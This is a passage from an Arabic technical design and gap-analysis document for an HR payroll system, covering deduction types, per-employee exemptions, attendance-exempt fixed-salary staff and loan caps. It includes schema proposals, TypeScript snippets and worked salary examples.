  ← 1,200 ≤ maxValue ✓  ·  3 ≤ maxInstallments ✓
  ← سلسلة: مدير القسم → HR   (approvalChainCode = CHAIN_MANAGER_HR — موجودة)
  ← بعد الاعتماد: 3 قيود DEBIT بـ400.00
       #1 effectiveDate 2026-08-23 → مسير سبتمبر
       #2 effectiveDate 2026-09-23 → مسير أكتوبر
       #3 effectiveDate 2026-10-23 → مسير نوفمبر

مثال ٢ — خصم بالأيام على أساس سعر اليوم
  نوع: ADMIN · calcMethod = DAYS · القيمة 2 (يومان)
  deductionBase = 8,200 → dayRate = 273.33
  المبلغ = 2 × 273.33 = 546.66
  ← الميزة: لو زاد راتب الموظف قبل الاستيفاء، الخصم يتناسب تلقائياً

مثال ٣ — تفعيل سقف الصافي والترحيل
  netBefore = 8,500  ·  pct = 50%  →  allowedMax = 4,250
  الخصومات القائمة:
     قسط سلفة (priority 20) ......... 2,000
     عهدة مفقودة (30) ............... 1,800
     خصم جودة قسط (40) ..............   400
     خصم تأخير (50) .................   350
     ───────────────────────────────────────
     المطلوب ....................... 4,550   ← يتجاوز 4,250 بـ300

  الاستيفاء بالأولوية:
     سلفة    2,000  → المتبقي 2,250
     عهدة    1,800  → المتبقي   450
     جودة      400  → المتبقي    50
     تأخير      50  من 350 → استُوفي جزئياً
     ───────────────────────────────────────
     المخصوم = 4,250  ·  netPay = 4,250
     المرحَّل = 300 (باقي خصم التأخير) → قيد جديد effectiveDate = 2026-08-23

  ⚠️ بدون هذه الخوارزمية، السلوك الحالي (payroll.service.ts:345-354):
     netPay = 8,500 − 4,550 = 3,950 — وهو صحيح هنا،
     لكن لو الخصومات كانت 9,000 → netPay = −500 ويُصرف رقم سالب.
```

**حالات حدّية للخصومات:**

| الحالة | القاعدة |
|---|---|
| الخصم اعتُمد بعد إقفال المسير | يُقيَّد بـ`effectiveDate` داخل الفترة التالية — الدفتر يستهلكه في أول مسير تشمله فترته. **لا رجعة على مسير مصروف** |
| الموظف ترك الشركة وعليه خصم غير مستوفى | يُرحَّل إلى تصفية نهاية الخدمة كسطر `SettlementLine` مدين — لا يسقط |
| الخصم على موظف داخل مسيرين لنفس الفترة | يُستهلك في **الأول** الذي يمرّ عليه (الدفتر `PENDING→APPLIED` عند الصرف). ⚠️ لكن **`PayrollRunMember` لا يُقرأ في أي مكان** (`payroll.entities.ts:82-95`) — فمسيران محسوبان ولم يُصرفا يقرآن نفس القيد `PENDING` ويظهر في القسيمتين. **الحاجز واجب البناء قبل تفعيل الخصومات بأنواع** |
| إلغاء خصم بعد اعتماده وقبل صرفه | إلغاء القيد (`obligations.service.ts:65-74` يمنع إلغاء `APPLIED` — سلوك صحيح) + `employee_deductions.status = CANCELLED` + إعادة حساب المسير المسودّة |
| اعتراض الموظف على خصم مصروف | `DEDUCTION_OBJECTION` (موجود) → معالج `payroll_adjustment` ينشئ **CREDIT** بقيمة الردّ (`destinations.service.ts:754`) — أي ردّ في المسير التالي لا تعديل رجعي. **سليم محاسبياً** |
| المُنزِّل يخصم على نفسه | يُمنع عند الإنشاء: `if (target.id === issuer.employeeId) throw` |
| نوع خصم عُطِّل (`isActive = 0`) وله خصومات جارية | الأقساط القائمة تكمل؛ يُمنع إنزال جديد فقط |
| خصم بنسبة على موظف بلا راتب مسجَّل | يُرفض عند الإنشاء برسالة واضحة بدل قيد بصفر |

---

### ٤-ج) الإعفاءات والمكافآت الفردية (⑧)

#### المطلوب
- خصومات التأخير والغياب تظهر تلقائياً — لكن **أقدر أشيل الخصومات كلها عن موظف بعينه**.
- أقدر أشيل **أي نوع خصم**: غياب · تأخير · التزام · جودة · أي خصم نزّلته.
- وأقدر أعطي **bonus/مكافأة** لموظف معيّن.

#### الحالة عندنا الآن

| العنصر | الحالة | الدليل |
|---|---|---|
| كيان إعفاء | **غير موجود إطلاقاً** | لا `PayrollExemption`، ولا حقل إعفاء على `PayrollItem` (`payroll.entities.ts:100-165`)، ولا على `Employee` |
| منطق تخطّي في الحساب | **لا يوجد شرط تخطٍّ واحد** | حلقة الحساب `payroll.service.ts:224-396` تحسب كل بند لكل موظف بلا استثناء |
| أقرب شيء موجود | **مفتاح عام للشركة كلها** | `payroll.late_deduction_enabled` — `payroll.service.ts:199-200`. **إما كل الشركة أو لا أحد.** لا يخدم «موظف بعينه» إطلاقاً |
| المكافأة الفردية | **موجودة وتعمل** ✅ | طلب `BONUS` (`requests-seed.data.ts:165`, chain `CHAIN_MANAGER_HR`, حقول `amount, reason`) → معالج `payroll_bonus` → قيد CREDIT (`destinations.service.ts:751`) → المسير يجمعه في `otherAdditions` (`payroll.service.ts:334-338`). الشاشة حقيقية: `src/app/payroll/bonuses/page.tsx:100` |

**الخلاصة:** المكافأة الفردية **جاهزة**. الإعفاء **صفر** — وهو البند الوحيد في المواصفة الذي لا يوجد له أي أساس في الكود.

#### التصميم المقترح

```
payroll_exemptions
─────────────────────────────────────────────────────────────────────
id             int PK
employeeId     int FK employees   INDEX
scopeKind      varchar(10)   -- RUN (مسير بعينه) | PERIOD (فترة بالتواريخ) | STANDING (دائم)
payrollRunId   int NULL      -- إلزامي لو scopeKind = RUN
fromDate       date NULL     -- إلزاميان لو scopeKind = PERIOD
toDate         date NULL
target         varchar(30)   -- ALL | LATENESS | ABSENCE | UNPAID_LEAVE | EARLY_LEAVE
                             --  | LOAN_INSTALLMENT | OBLIGATION | TYPED_DEDUCTION
deductionTypeId int NULL     -- يضيّق TYPED_DEDUCTION لنوع بعينه (جودة فقط مثلاً)
maxAmount      decimal(18,2) NULL   -- إعفاء جزئي بسقف (NULL = إعفاء كامل)
reason         varchar(500)  -- إلزامي — «عطل حافلة الشركة، محضر HR-2026-77»
evidenceFileId int NULL
grantedByUserId int          -- مين أعفى
grantedAt      datetime      -- إمتى
revokedByUserId int NULL     -- سحب الإعفاء (لا يُحذف أبداً — أثر تدقيقي)
revokedAt      datetime NULL
─────────────────────────────────────────────────────────────────────
INDEX (employeeId, payrollRunId)
الصلاحية: 'deduction.exempt'  ·  ويُفضَّل سلسلة اعتماد للإعفاء فوق مبلغ معيّن
```

**نقطة الاشتباك في محرك الحساب** — دالة واحدة تُستدعى قبل كل بند خصم داخل حلقة `payroll.service.ts:224-396`:

```ts
// يُحمَّل مرة واحدة قبل الحلقة، ثم يُستشار لكل بند
const exemptionFor = (empId: number, target: string, typeId?: number) =>
  exemptions.find(x =>
    x.employeeId === empId && !x.revokedAt &&
    (x.target === 'ALL' || x.target === target) &&
    (x.deductionTypeId == null || x.deductionTypeId === typeId) &&
    (x.scopeKind === 'STANDING' ||
     (x.scopeKind === 'RUN'    && x.payrollRunId === run.id) ||
     (x.scopeKind === 'PERIOD' && x.fromDate <= endDate && x.toDate >= startDate))
  )

// التطبيق — النمط الموحّد لكل بند خصم:
const gross_    = latenessDeductionRaw            // المحسوب أصلاً
const ex        = exemptionFor(emp.id, 'LATENESS')
const exempted  = ex ? (ex.maxAmount != null ? Math.min(ex.maxAmount, gross_) : gross_) : 0
const applied   = round2(gross_ - exempted)

lines.push({
  kind: 'DEDUCTION', sourceType: 'LATENESS', label: 'خصم تأخير',
  qty: lateMinutes, rate: minuteRate,
  grossAmount: gross_,      // ← الأصل قبل الإعفاء
  amount: applied,          // ← الفعلي بعد الإعفاء
  exemptionId: ex?.id ?? null,
})
```

**أثره على القسيمة — القاعدة الحاسمة:** البند **لا يختفي**، يظهر بصفر مع بيان الإعفاء. ده مطلب صريح في المواصفة وهو الصحيح تدقيقياً (لو اختفى، الموظف يفتكر إن النظام لم يرصد تأخيره أصلاً، ولا يمكن مراجعة قرار الإعفاء لاحقاً):

```
─────────────────────────────────────────────────────────────
  الخصومات
─────────────────────────────────────────────────────────────
  خصم تأخير (285 دقيقة × 0.5556) .......  158.35   →  0.00  ✱
  خصم غياب (2 يوم × 273.33) ............  546.66   →  546.66
  خصم جودة — قسط 1 من 3 ................  400.00   →  400.00
  قسط سلفة .............................  1,000.00 →  1,000.00
─────────────────────────────────────────────────────────────
  إجمالي الخصومات ...................... 1,946.66
  (لولا الإعفاء لكانت 2,105.01)

  ✱ معفى بقرار #EX-41 — بواسطة: أ. محمد (مدير الفرع) — 2026-08-14
    السبب: عطل حافلة الشركة أيام 5-7 أغسطس (محضر HR-2026-77)
─────────────────────────────────────────────────────────────
```

ويُسجَّل في `breakdown` للتدقيق: `exemptions: [{ id, target, grossAmount, exemptedAmount, grantedBy, reason }]`.

**المكافأة الفردية:** المسار الموجود (`BONUS` → CREDIT → `otherAdditions`) **يُبقى كما هو**، ويُضاف عليه فقط سطر مفصَّل في `payroll_item_lines` بدل الرقم المجمَّع، ونوع `bonus_types` اختياري (حافز أداء / مكافأة مشروع / عيدية) على نفس نمط `deduction_types`.

**أمثلة رقمية:**

```
مثال ١ — إعفاء كامل من التأخير في مسير واحد
  موظف تأخّر 285 دقيقة موزّعة على 3 أيام · minuteRate = 0.5556 → 158.35
  إعفاء: scopeKind=RUN, payrollRunId=17, target=LATENESS, maxAmount=NULL
  ⇒ grossAmount 158.35 · amount 0.00 · netPay يزيد 158.35

مثال ٢ — إعفاء جزئي بسقف
  خصم غياب 3 أيام = 819.99 · إعفاء بـmaxAmount = 500
  ⇒ exempted = min(500, 819.99) = 500 · applied = 319.99
  القسيمة: «خصم غياب 819.99 → 319.99 (أُعفي 500 — قرار #EX-52)»

مثال ٣ — إعفاء شامل ALL لموظف في مسير الترقية
  target = ALL → تأخير 158.35 + غياب 546.66 + جودة 400 = 1,105.01 كلها تصفير
  ⚠️ الأقساط والسلف تُعفى فقط لو target=ALL بوضوح — والأفضل استثناؤها
     من ALL بقاعدة صريحة (السلفة دَين لا عقوبة؛ إعفاؤها = هبة تحتاج قراراً منفصلاً)
     ⇒ القاعدة الموصى بها: ALL يغطي LATENESS + ABSENCE + EARLY_LEAVE + TYPED_DEDUCTION
       ولا يغطي LOAN_INSTALLMENT إلا بإعفاء صريح بهذا الاسم
```

**حالات حدّية للإعفاءات:**

| الحالة | القاعدة |
|---|---|
| إعفاء أُصدر بعد حساب المسير (مسودّة) | إعادة حساب المسير تلتقطه — النظام يحذف ويعيد البناء (`payroll.service.ts:194`) |
| إعفاء أُصدر بعد **صرف** المسير | يُرفض على المسير المصروف. الطريق الصحيح: قيد CREDIT بقيمة الردّ في المسير التالي (نفس آلية `DEDUCTION_OBJECTION`) |
| إعفاءان متداخلان على نفس البند | **لا تجميع** — يُطبَّق الأوسع (`maxAmount=NULL` يغلب أي سقف)، ويُسجَّل الاثنان في `breakdown` |
| إعفاء دائم (`STANDING`) بلا نهاية | مسموح، لكن يظهر بعلامة تحذير في تقرير «الإعفاءات الدائمة» — لأنه فعلياً يحوّل الموظف لمستثنى بلا قرار رسمي |
| من يملك الإعفاء؟ | `deduction.exempt` — ويُنصح بربطه بسلسلة اعتماد فوق حدّ مبلغ (`ApprovalStep.thresholdValue` جاهزة — `approval-step.entity.ts:57-59`) |
| إعفاء على مسير لم يُنشأ بعد | `scopeKind = PERIOD` بالتواريخ هو الحل — لا يحتاج `payrollRunId` |

---

### ٤-د) الموظفون المستثنون من الحضور (⑨)

#### المطلوب
- في موظفين **مستثنون من الحضور والانصراف والغيابات**: مرتبهم ينزل **ثابت شهرياً**.
- عايز طريقة أعرّف بها هؤلاء الموظفين.

#### الحالة عندنا الآن — **صفر**

بحث شامل عن `exempt|attendanceExempt|noAttendance|fixedSalary|excludeFromAttendance` في `api/src` و`src` = **صفر نتائج**. كيان `Employee` فيه `workScheduleId:128`، `annualLeaveEntitled:134`، `workType:146`، `contractType:167` — **ولا واحد منها يوقف الحضور**.

**النتيجة العملية الضارّة اليوم:**

```
payroll.service.ts:259  →  await materializeAbsences(emp.id, startDate, endDate)
attendance.service.ts:543-586:
   تمرّ على كل يوم في الفترة، تتخطّى العطلات والويك إند فقط،
   وأي يوم عمل بلا بصمة ولا إجازة  →  computeDay  →  status = 'absent'

payroll.service.ts:284-286:
   absenceDeduction = عدد أيام absent × dayRate × attendance.absence_penalty_days
```

يعني: **مدير الفرع، المندوب الميداني، الموظف عن بُعد، والمدير التنفيذي — كل من لا يبصم يُجسَّد له غياب ويُخصم منه فعلياً.** وده أخطر بند في القسم كله لأنه **يُنفَّذ بصمت اليوم وينتج أرقاماً خاطئة في مسيرات حقيقية**.

#### التصميم المقترح

**علم على الموظف (أوضح من علم منطقي — ٣ حقول):**

```
employees  (أعمدة جديدة)
─────────────────────────────────────────────────────────────────────
salaryMode           varchar(20) default 'ATTENDANCE_BASED'
                     -- ATTENDANCE_BASED : الوضع الحالي (خصومات من البصمة)
                     -- FIXED_MONTHLY    : راتب ثابت — مستثنى من الحضور

attendanceExemptFrom date NULL   -- من إمتى (NULL = من التعيين)
attendanceExemptTo   date NULL   -- لحد إمتى (NULL = مفتوح)

overtimeEligible     bit default 1   -- يستحق أوفرتايم؟ (الافتراضي للمستثنى: 0)

attendanceExemptReason varchar(300) NULL   -- «مدير فرع — طبيعة عمل ميدانية»
exemptGrantedByUserId  int NULL
```

> **ليه تواريخ سريان؟** لأن الاستثناء قرار إداري يتغيّر: موظف يُرقّى لمدير في منتصف السنة فيصير مستثنى، أو مندوب يُنقل لمكتب فيعود للبصمة. بدون تواريخ، تغيير العلم يؤثّر بأثر رجعي على كل المسيرات القديمة عند إعادة حسابها.

**جدول السلوك — قاعدة واحدة تحكم كل شيء:**

| البند | `ATTENDANCE_BASED` | `FIXED_MONTHLY` (مستثنى) |
|---|---|---|
| تجسيد الغياب `materializeAbsences` | يعمل | **لا يعمل** — الأيام تُسجَّل `status = 'exempt'` بدل `'absent'` |
| خصم الغياب | يُطبَّق | **صفر دائماً** |
| خصم التأخير (شرائح) | يُطبَّق | **صفر دائماً** |
| خصم الانصراف المبكر | (غير مستهلَك أصلاً — `audit-att` بند F/HIGH) | **صفر دائماً** |
| خصم دقائق الإذن «بخصم» | يُطبَّق | **صفر دائماً** |
| **إجازة بدون راتب** | تُخصم | **تُخصم كالمعتاد** ← الاستثناء لا يغطيها |
| **أقساط السلف** | تُخصم | **تُخصم كالمعتاد** — دَين لا عقوبة |
| **دفتر المديونيات / خصومات بأنواع** | تُخصم | **تُخصم كالمعتاد** — خصم الجودة لا علاقة له بالبصمة |
| البدلات | تُصرف | **تُصرف كاملة** |
| **الأوفرتايم** | يُحتسب | **لا يُحتسب افتراضياً** (`overtimeEligible = 0`)، وقابل للتفعيل فردياً |
| البصمة نفسها | مطلوبة | **تُسجَّل لو بصم** (للسجل الحضوري والتقارير) لكن **بلا أي أثر مالي** |

**المبدأ الحاكم — وهو أهم سطر في هذا البند:**

> **الاستثناء يلغي الخصومات المستنتَجة من غياب البصمة فقط. لا يلغي الخصومات المقرَّرة بقرار موثّق.**
>
> يعني: الغياب والتأخير **استنتاج** من عدم وجود بصمة → يسقط بالاستثناء. أما الإجازة بدون راتب، وقسط السلفة، وخصم الجودة، والعهدة المفقودة — كلها **قرارات موثّقة مستقلة عن البصمة** → لا تسقط. لو الاستثناء ألغاها، لصار المستثنى موظفاً بلا محاسبة مالية إطلاقاً، وهذا ليس المقصود من المواصفة.

**نقاط التعديل بالضبط في الكود:**

```ts
// (1) attendance.service.ts:543  داخل materializeAbsences — الحارس الأول والأهم
const exempt = emp.salaryMode === 'FIXED_MONTHLY' &&
  (!emp.attendanceExemptFrom || emp.attendanceExemptFrom <= toDate) &&
  (!emp.attendanceExemptTo   || emp.attendanceExemptTo   >= fromDate)
if (exempt) return 0     // لا تُجسّد غياباً إطلاقاً — يوقف النزيف فوراً

// (2) attendance.service.ts:1082-1120  داخل computeDay
// لو مستثنى: احسب workMinutes للتقارير، وصفّر lateMinutes / earlyLeaveMinutes
// / deductibleMinutes، وضع status = 'exempt' لليوم بلا بصمة

// (3) payroll.service.ts:269-286  الحارس الثاني (دفاع في العمق)
if (emp.salaryMode === 'FIXED_MONTHLY') {
  latenessDeduction = 0; absenceDeduction = 0; absenceDays = 0
  // ويُسجَّل سطر توضيحي في القسيمة، لا حذف صامت
}

// (4) payroll.service.ts:236-252  الأوفرتايم
if (emp.salaryMode === 'FIXED_MONTHLY' && !emp.overtimeEligible) {
  otHours = 0; otAmount = 0
}

// (5) attendance.entities.ts:144-203  إضافة 'exempt' لقائمة status المسموحة
```

**ظهوره في الكشف الشهري** (`src/app/attendance/monthly-sheet/page.tsx`):

```
الموظف: أ. محمد الغامدي — مدير فرع الرياض     [راتب ثابت — مستثنى من الحضور]
        (شارة رمادية ثابتة أعلى الصف، لا حمراء)

  23  24  25  26  27  28  29  30  31  01  02  03  ...
  ●   ●   ⊘   ⊘   —   —   ●   ⊘   ●   ●   ⊘   ⊘
  ● حضر ببصمة (للسجل)   ⊘ مستثنى — بلا أثر مالي   — ويك إند/عطلة

  ملخص الشهر:  أيام العمل 22 · بصم فيها 9 · مستثنى 13 · غياب 0 · خصم 0.00
```

القاعدة: **لا يُحسب غياب ولا يظهر لون تحذيري إطلاقاً**، لكن أيام البصمة تظهر (لأنها معلومة حقيقية مفيدة للمالك)، والشارة تُفسّر السبب فوراً. وفي **تقارير الالتزام** يُستبعد المستثنون من مقام النِّسَب (وإلا نسبة الالتزام تنهار بلا سبب).

**أمثلة رقمية:**

```
مثال ١ — الحالة الأساسية: مدير فرع لم يبصم 13 يوماً
  أساسي 15,000 · بدلات 4,000 → deductionBase = 19,000 → dayRate = 633.33
  attendance.absence_penalty_days = 1

  الوضع الحالي (بلا استثناء):
     absenceDays = 13  →  absenceDeduction = 13 × 633.33 × 1 = 8,233.29
     netPay = 19,000 − 8,233.29 = 10,766.71     ← خصم 43% من راتب المدير ظلماً

  بعد الاستثناء:
     absenceDays = 0 · absenceDeduction = 0.00
     netPay = 19,000.00                          ✓

  ولو معامل الغياب مضبوط 1.5 (المسموح في payroll-rules):
     الخصم الخاطئ = 12,349.94 → netPay = 6,650.06 — أي ثلث الراتب.

مثال ٢ — مستثنى أخذ إجازة بدون راتب 5 أيام
  الاستثناء لا يغطيها → unpaidDeduction = 5 × 633.33 = 3,166.65
  netPay = 19,000 − 3,166.65 = 15,833.35
  القسيمة: «إجازة بدون راتب (5 أيام × 633.33) = 3,166.65»
           «خصم غياب: لا ينطبق — موظف براتب ثابت»

مثال ٣ — مستثنى عليه قسط سلفة + خصم جودة
  قسط سلفة 2,000 + خصم جودة 400 → netPay = 19,000 − 2,400 = 16,600
  الاستثناء لم يمسّهما — قرارات موثّقة لا استنتاجات بصمة  ✓

مثال ٤ — مستثنى عُيّن داخل الفترة (تناسب الراتب)
  الفترة 2026-07-23 → 2026-08-22 (31 يوماً) · joinDate = 2026-08-10
  أيام الخدمة داخل الفترة = 10→22 أغسطس = 13 يوماً

  الطريقة (أ) بأيام الفترة الفعلية:  19,000 × 13/31 = 7,967.74
  الطريقة (ب) بـmonthly_days = 30:   633.33 × 13    = 8,233.29
  ⇒ الفرق 265.55 — لذلك يجب مفتاح صريح:
     payroll.proration_basis = PERIOD_DAYS | MONTHLY_DAYS   (الموصى به: PERIOD_DAYS)

  ⚠️ تنبيه: النظام اليوم لا يُجزّئ الراتب إطلاقاً.
     payroll.service.ts:225 يأخذ basicSalary كاملاً بلا نظر لـjoinDate،
     وبحث prorate|proRat|joinDate في api/src/payroll/ = صفر نتائج.
     يعني موظف عيّن يوم 20 من الفترة يقبض شهراً كاملاً.
     الفجوة دي عامة (تمسّ الجميع لا المستثنين وحدهم) لكنها تظهر أوضح
     مع المستثنى — لأن ATTENDANCE_BASED «تتصحّح» جزئياً بالغلط عن طريق
     خصم أيام ما قبل التعيين كغياب... وهي في الحقيقة مصادفة لا تصميم،
     و materializeAbsences تحترم joinDate أصلاً (attendance.service.ts:552)
     فلا تُجسّد غياباً قبل التعيين — إذن الموظف الجديد يقبض شهراً كاملاً في
     الحالتين. الإصلاح واجب لكليهما.

مثال ٥ — مستثنى انتهت خدمته داخل الفترة
  الفترة 23/7 → 22/8 · lastWorkingDay = 2026-08-05  → 14 يوماً خدمة
  الراتب = 19,000 × 14/31 = 8,580.65
  والباقي يمرّ عبر تصفية نهاية الخدمة (offboarding.service.ts:218+)
  ⚠️ لكن resolveScope (payroll.service.ts:109) يفلتر بـ isActive: true فقط —
     فالموظف المؤرشَف داخل الفترة يسقط من المسير كلياً ولا يقبض الـ14 يوم.
     الإصلاح: يدخل المسير من عمل يوماً واحداً داخل الفترة:
       WHERE joinDate <= endDate AND (archivedAt IS NULL OR archivedAt >= startDate)
```

**حالات حدّية للمستثنين:**

| الحالة | القاعدة |
|---|---|
| **إجازة بدون راتب لمستثنى** | **تُخصم** — قرار موثّق لا استنتاج بصمة. القسيمة تُظهر الخصم مع سطر توضيحي «خصم غياب: لا ينطبق — راتب ثابت» عشان الفرق واضح |
| **تعيين داخل الفترة** | تناسب بأيام الخدمة (مثال ٤) + `payroll.proration_basis`. وهي فجوة عامة في النظام اليوم |
| **انتهاء خدمة داخل الفترة** | تناسب + إصلاح `resolveScope` ليشمل من عمل يوماً داخل الفترة (مثال ٥) |
| **العلم فُعِّل في منتصف الفترة** | التقسيم بـ`attendanceExemptFrom`: الأيام قبله تُحسب بالبصمة، وبعده بلا خصم. **بدون التواريخ يستحيل هذا** |
| **مستثنى بصم فعلاً وعمل ساعات إضافية** | `overtimeEligible = 0` (الافتراضي) → لا يُصرف. لو المالك أراد استثناءً فردياً (مندوب مستثنى لكنه يستحق إضافي) → `overtimeEligible = 1` على الموظف نفسه |
| **مستثنى في تقرير الالتزام/التأخير** | يُستبعد من **المقام** لا يُحسب صفراً — وإلا نسبة الالتزام العامة تنخفض بلا سبب حقيقي |
| **مستثنى غاب فعلاً بلا إذن** | خارج نطاق النظام الآلي — المدير ينزّل «خصم إداري» بأيام عبر `deduction_types` بـ`calcMethod = DAYS` (٤-ب). ده بالضبط سبب فصل «الاستنتاج» عن «القرار الموثّق» |
| **صفوف حضور قديمة `absent` لموظف صار مستثنى** | تُمسح أو تُحوَّل `exempt` بمهمة ترحيل لمرة واحدة — وإلا إعادة حساب مسير قديم تحتفظ بالخصم الخاطئ |

---

### ملخّص التنفيذ — الترتيب المُوصى به

| # | العمل | لماذا الآن | الحجم |
|---|---|---|---|
| **1** | حارس `salaryMode = FIXED_MONTHLY` في `materializeAbsences` (`attendance.service.ts:543`) + `payroll.service.ts:284` | **ينزف اليوم** — خصم غياب فعلي على المديرين والميدانيين في مسيرات حقيقية | عمود + ~15 سطر |
| **2** | إصلاح جمع `phoneAllowance + workNatureAllowance` في `payroll.service.ts:227` و`offboarding.service.ts:226` + hook مزامنة في الباك | **ينزف اليوم** بصمت في الرواتب ومكافآت نهاية الخدمة | ~20 سطر |
| **3** | أرضية `netPay` + سقف نسبة الخصم من الصافي + الترحيل (`payroll.service.ts:345`) | يمنع صافياً سالباً قبل ما نضيف قناة خصومات جديدة | ~40 سطر |
| **4** | قراءة `PayrollRunMember` كحاجز ضد ازدواج الصرف (`payroll.entities.ts:82`) | **شرط سابق** لتفعيل الخصومات بأنواع — وإلا الخصم يظهر في مسيرين | ~25 سطر |
| **5** | `payroll_item_lines` — تفصيل القسيمة | الأساس الذي تقف عليه البدلات والخصومات والإعفاءات كلها | كيان + بناء السطور |
| **6** | `allowance_types` + `employee_allowances` + `GET /me/allowances` + شاشة البدلات الحقيقية | البند ⑥ كاملاً، وإحلال دائم لأعمدة البدلات الثابتة | كيانان + CRUD + شاشة |
| **7** | `deduction_types` + `employee_deductions` + صلاحيات `deduction.issue.*` + `issuerScope` + الربط بسلاسل الاعتماد الموجودة + التقسيط | البند ⑦ كاملاً — وهو أكبر بند في هذا القسم | كيانان + صلاحيات + نوع طلب + شاشتان |
| **8** | `payroll_exemptions` + نقاط الاشتباك في الحساب + عرض «صفر مع بيان» في القسيمة | البند ⑧ — المكافأة الفردية جاهزة بالفعل، الناقص هو الإعفاء فقط | كيان + ~60 سطر + عرض |
| **9** | تناسب الراتب لأيام الخدمة (`payroll.proration_basis`) + إصلاح `resolveScope` ليشمل من عمل جزءاً من الفترة | فجوة عامة تظهر بحدّة في حالات ⑨ الحدّية | ~30 سطر |

---

## ٥) السلف والأوفرتايم والتقارير

> هذا القسم يغطّي البنود ⑩ ⑪ ⑫ من مواصفة صاحب النظام، بالإضافة إلى حزمة التقارير. كل بند مكتوب على أربع طبقات: **المطلوب** ← **الحالة الفعلية عندنا** (بدليل ملف:سطر) ← **التصميم** (كيانات/حقول/قواعد) ← **أمثلة رقمية وحالات حدّية**.

---

### ٥-١) سقوف السلف (⑩)

#### المطلوب حرفيًا
> «أحطّ limit للسلف التي تظهر للموظفين، مثلاً 10% من الراتب · أو قيمة مقطوعة لا يتجاوزها أي موظف في الشركة · أو تحديد السلف المسموح بها في الشهر.»

#### الحالة عندنا الآن — **غير موجود إطلاقًا (صفر)**

| البند | الحالة | الدليل |
|---|---|---|
| مفتاح إعداد لسقف السلف | **غير موجود** | `api/src/seed/requests-seed.data.ts` — البذرة لا تحوي أي مفتاح `loan.*`. الموجود فقط نوع الطلب `LOAN` (سطر 162) و`EARLY_LOAN_SETTLEMENT` (سطر 167) |
| تحقق وقت الطلب | **غير موجود** | `api/src/requests/requests.service.ts:172-199` — التحقق الوحيد هو **وجود** الحقل ونوعه (رقم/قائمة). لا سقف ولا مقارنة بالراتب |
| تحقق وقت الاعتماد/التنفيذ | **غير موجود** | `api/src/requests/destinations.service.ts:236-237` → `const amount = Number(payload.amount)` مباشرة بلا أي فحص. الموظف يقدر يكتب 500,000 وتمرّ |
| عدد السلف المسموح بها شهريًا | **غير موجود** | لا استعلام على السلف القائمة قبل الإنشاء |
| سقف عدد الأشهر | **غير موجود** | `destinations.service.ts:237` → `Math.max(1, Number(payload.months ?? 1))` — بلا حد أعلى، `months = 60` تمرّ |

**الخلاصة:** النظام اليوم يقبل **أي مبلغ على أي عدد أشهر**، والحاجز الوحيد بشري (سلسلة الاعتماد `CHAIN_MANAGER_FINANCE_T`). ده مخالف مباشر للبند ⑩.

#### التصميم المقترح — كيان `loan_policies`

بدل مفاتيح config عامة (اللي بتخلّي الشركة كلها بسقف واحد)، الأفضل **سياسة سلف قابلة للتعريف بنطاق**، تمامًا زي منطق `PayrollPolicy` و`OvertimePeriod`:

```ts
@Entity('loan_policies')
export class LoanPolicy {
  id: number
  name: string                 // «سياسة سلف الموظفين — عام»
  // ===== النطاق (الأخص يتقدّم على الأعم) =====
  scopeType: 'COMPANY' | 'BRANCH' | 'DEPARTMENT' | 'GRADE' | 'EMPLOYEE'
  scopeIds: string             // JSON: [3, 7]
  priority: number             // كسر التعادل عند تساوي التخصيص
  // ===== السقوف =====
  basisType: 'BASIC' | 'GROSS' // الأساس الذي تُحسب عليه النسبة
  maxPercentOfSalary: number|null   // 10.00  → 10% من الأساس
  maxAmount: number|null            // 5000.00 مبلغ مقطوع
  maxMonths: number|null            // 6
  minAmount: number|null            // 200 — منع سلف تافهة
  // ===== الحدود الدورية =====
  maxLoansPerMonth: number|null     // 1 سلفة/شهر
  maxLoansPerYear: number|null      // 3
  maxConcurrentActive: number|null  // 1 سلفة قائمة في وقت واحد
  cooldownDays: number|null         // 30 يومًا بعد إقفال سلفة
  // ===== سقوف المديونية والصافي =====
  maxOutstandingPercent: number|null   // 30% من الإجمالي = أقصى رصيد مديونية قائم
  maxInstallmentPercentOfNet: number|null // 25% — القسط لا يتجاوز ربع الصافي
  minNetPercent: number|null           // 50% — الصافي لا يقل عن نصف الإجمالي
  // ===== الأهلية =====
  minServiceMonths: number|null     // 6 أشهر خدمة
  allowedContractTypes: string|null // JSON
  requiresProbationPassed: boolean
  isActive: boolean
}
```

#### قاعدة التعارض: **الأقل يفوز (Most-Restrictive-Wins)**

مش «أول سياسة مطابقة تفوز» — لأن السقوف طبيعتها تراكمية. الخوارزمية:

```
resolveLoanCap(employee, requestedAmount, requestedMonths, today):
  1. policy = أخصّ سياسة نشطة تطابق الموظف
     (EMPLOYEE > GRADE > DEPARTMENT > BRANCH > COMPANY، وعند التساوي: priority الأعلى)

  2. base = policy.basisType === 'GROSS'
            ? basicSalary + Σ(البدلات الدائمة)
            : basicSalary

  3. المرشّحون للسقف (كل واحد قيمة مطلقة بالجنيه):
     capA = policy.maxPercentOfSalary ? base × pct/100 : ∞
     capB = policy.maxAmount ?? ∞
     capC = policy.maxOutstandingPercent
              ? (base × pct/100) − outstandingBalance(employee)
              : ∞
     capD = policy.maxInstallmentPercentOfNet
              ? (estimatedNet × pct/100) × requestedMonths
              : ∞

  4. effectiveCap = max(0, MIN(capA, capB, capC, capD))     ← «الأقل يُطبَّق»
     cappedBy     = اسم القيد الفائز (للرسالة التوضيحية)

  5. فحوص عدّادية منفصلة (لا تدخل في MIN — ترفض مباشرة):
     - COUNT(loans نشطة) ≥ maxConcurrentActive         → رفض
     - COUNT(loans أُنشئت هذا الشهر) ≥ maxLoansPerMonth → رفض
     - today − lastSettledAt < cooldownDays             → رفض
     - serviceMonths < minServiceMonths                 → رفض
     - requestedMonths > maxMonths                      → رفض
```

**نقطة تصميم مهمة:** الـUI لازم تعرض للموظف `effectiveCap` **قبل** ما يكتب المبلغ، مع سبب السقف («الحد المتاح لك 800 ج — مقيَّد بنسبة 10% من الراتب»). ده اللي بيقلّل الطلبات المرفوضة ويحقّق «limit للسلف **التي تظهر للموظفين**» زي ما البند ⑩ نص عليه.

#### نقاط التحقق الثلاث (لازم كلها — مش واحدة)

| النقطة | متى | لماذا لازمة | مكان التنفيذ عندنا |
|---|---|---|---|
| **T1 — وقت الطلب** | إنشاء `LOAN` | يمنع الطلب المستحيل من دخول السلسلة أصلًا | `requests.service.ts` قبل `save` (بعد سطر 199) |
